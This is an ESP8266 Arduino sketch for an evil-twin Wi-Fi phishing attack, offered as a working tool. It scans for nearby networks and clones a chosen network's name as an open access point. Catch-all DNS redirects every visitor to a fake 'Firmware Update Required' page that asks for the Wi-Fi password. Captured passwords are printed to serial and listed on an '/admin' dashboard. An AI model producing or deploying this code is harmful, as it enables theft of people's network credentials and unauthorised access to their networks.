#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Global state variables
String target_ssid = "balaji_home"; // Fallback default name
String captured_logs = "";          // Stores captured data in RAM for the Admin Portal

// The Phishing Template Screen shown to victims
const char phishingHTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
    .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 280px; }
    input[type=password] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; }
    button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 98%; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Firmware Update Required</h2>
    <p>Please re-enter your Wi-Fi password to apply the latest router system patch.</p>
    <form action="/login" method="POST">
      <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
      <button type="submit">Submit</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

// --- CORE HANDLER FUNCTIONS ---

void handleRoot() {
  webServer.send_P(200, "text/html", phishingHTML);
}

void handleLogin() {
  String password = webServer.arg("password");

  // 1. Log directly to the raw Hardware Serial line (your laptop terminal window)
  Serial.println("");
  Serial.println("=====================================");
  Serial.print("[!] ATTACHED CLIENT ENTRY CAPTURED: ");
  Serial.println(password);
  Serial.println("=====================================");

  // 2. Append to internal RAM buffer for the dynamic Admin Browser Portal
  captured_logs += "<li>[Captured Log]: " + password + "</li>";

  webServer.send(200, "text/html", "<h2>Update installation initiated. Connection will resume shortly.</h2>");
}

// Dedicated Admin Portal Web View accessible at http://192.168.4
void handleAdminPortal() {
  String html = "<!DOCTYPE html><html><head><title>Admin Control Panel</title>";
  html += "<style>body{font-family:sans-serif;background:#222;color:#fff;padding:30px;} h1{color:#ff3333;} ul{background:#333;padding:20px;border-radius:5px;list-style-type:none;}</style></head><body>";
  html += "<h1>ESP8266 Live Security Monitoring Dashboard</h1>";
  html += "<p>Active Cloned Target Network Name: <b>" + target_ssid + "</b></p>";
  html += "<h3>Captured Form Entries Streams:</h3>";
  html += "<ul>";
  if (captured_logs == "") {
    html += "<li><i>No target client submissions logged yet. Waiting...</i></li>";
  } else {
    html += captured_logs;
  }
  html += "</ul>";
  html += "<br><button onclick='location.reload()'>Refresh Active Logs</button>";
  html += "</body></html>";

  webServer.send(200, "text/html", html);
}

// Interactive Network Mapping engine via the Serial interface
void interactiveNetworkScan() {
  Serial.println("\n[*] Initializing Onboard Radio Scan parameters...");
  WiFi.mode(WIFI_STA); // Switch momentarily to Client mode to scan
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks();
  Serial.println("[+] Airwave Scan Complete.");
  
  if (n == 0) {
    Serial.println("[-] No active wireless networks found. Using default profile.");
    return;
  }

  Serial.println("\n----------------- DISCOVERED WIRELESS SIGNATURES -----------------");
  for (int i = 0; i < n; ++i) {
    Serial.print("["); Serial.print(i); Serial.print("] ");
    Serial.print(WiFi.SSID(i)); Serial.print(" (Signal: ");
    Serial.print(WiFi.RSSI(i)); Serial.println(" dBm)");
    delay(10);
  }
  Serial.println("------------------------------------------------------------------");
  Serial.print("\n--> ENTER TARGET INDEX NUMBER TO CLONE: \n");

  // Loop execution waits indefinitely until Admin enters an input character
  while (!Serial.available()) {
    delay(100);
  }

  int selection = Serial.parseInt();
  if (selection >= 0 && selection < n) {
    target_ssid = WiFi.SSID(selection);
    Serial.println("");
    Serial.print("[+] Target Network Locked: '");
    Serial.print(target_ssid);
    Serial.println("'");
  } else {
    Serial.println("\n[-] Invalid selection profile. Defaulting to: 'balaji_home'");
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Phase 1: Interactive Target Mapping Menu over Serial Link
  interactiveNetworkScan();

  // Phase 2: Transmit Cloned Access Point
  Serial.println("\n[*] Initializing radio configurations into Master mode...");
  WiFi.mode(WIFI_AP);
  
  // Dynamically uses the SSID selected in Phase 1
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(target_ssid.c_str()); 

  // Phase 3: Ignite local routing and web servers
  dnsServer.start(DNS_PORT, "*", apIP);

  // Mapping Portal Web Routes
  webServer.on("/admin", HTTP_GET, handleAdminPortal); // Admin Dashboard Link
  webServer.on("/login", HTTP_POST, handleLogin);      // Target Form Action
  webServer.onNotFound(handleRoot);                   // Trap Redirection Endpoints
  
  webServer.begin();
  
  // Corrected text decoration block
  Serial.println("\n==================================================");
  Serial.print("[+] EVIL TWIN ACTIVE AND BROADCASTING: '"); Serial.print(target_ssid); Serial.println("'");
  Serial.println("[*] ADMIN PORTAL PATH: http://192.168.4");
  Serial.println("==================================================\n");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
